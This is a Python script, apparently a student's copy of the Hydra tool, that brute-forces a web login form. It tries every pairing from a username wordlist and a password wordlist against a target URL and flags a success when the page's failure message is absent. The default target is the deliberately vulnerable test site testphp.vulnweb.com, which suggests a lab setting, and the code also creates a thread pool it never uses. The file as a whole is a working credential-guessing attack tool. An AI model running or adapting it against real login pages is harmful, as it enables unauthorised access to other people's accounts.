import requests
from multiprocessing.pool import ThreadPool
from colorama import init, Fore
import time

init(autoreset=True)  # Initialize colorama

class HydraReplica:
    #constructor
    def __init__(self, usernames, password_list, target, login_url, username_field, password_field, failure_message):
        # Initialize HydraReplica object with necessary parameters
        self.usernames = usernames
        self.password_list = password_list
        self.target = target
        self.login_url = login_url
        self.username_field = username_field
        self.password_field = password_field
        self.failure_message = failure_message

        # Display information about the Hydra replica
        print("-"*50)
        print("Hydra Replica")
        print("Author: Ahmed Basem - 202000188")
        print("-"*50)

    def test_credentials(self, credentials):
        # Test a set of credentials against the target login form
        username, password = credentials
        session = requests.Session()
        data = {self.username_field: username, self.password_field: password}
        response = session.post(self.target + self.login_url, data=data)
        
        # Print each trial
        print(f"Trying {self.username_field}={username}, {self.password_field}={password}", end='\r', flush=True)
        
        # Check if the login attempt was successful
        if self.failure_message not in response.text:
            print("\n" + Fore.GREEN + f"Successful login: {self.username_field}={username}, {self.password_field}={password}")
            return True
        else:
            return False

    def run_hydra(self):
        # Run the Hydra replica with a ThreadPool for parallel processing
        start_time = time.time()
        total_trials = 0

        with ThreadPool() as pool:
            # Read usernames and passwords from files
            usernames = [line.strip() for line in open(self.usernames)]
            passwords = [line.strip() for line in open(self.password_list)]
            
            # Generate all possible combinations of usernames and passwords
            credentials = [(username, password) for username in usernames for password in passwords]

            # Iterate through each set of credentials
            for cred in credentials:
                total_trials += 1
                # If successful login, break the loop
                if self.test_credentials(cred):
                    break

        # Calculate and display total trials and elapsed time
        end_time = time.time()
        elapsed_time = end_time - start_time

        print(f"\nTotal trials: {total_trials}")
        print(f"Time taken: {elapsed_time:.2f} seconds")
        print(f"Trials per second: {total_trials / elapsed_time:.2f}")

if __name__ == "__main__":
    # Replace these values with your actual data
    usernames_file = "MyUserlist.txt"
    password_list = "MyPasslist.txt"
    target = "http://testphp.vulnweb.com"
    login_url = "/userinfo.php"
    username_field = "uname"  # Replace with the actual form field name for username
    password_field = "pass"  # Replace with the actual form field name for password
    failure_message = "If you are already registered please enter your login information below"

    # Create an instance of HydraReplica and run the Hydra attack
    hydra_replica = HydraReplica(usernames_file, password_list, target, login_url, username_field, password_field, failure_message)
    hydra_replica.run_hydra()
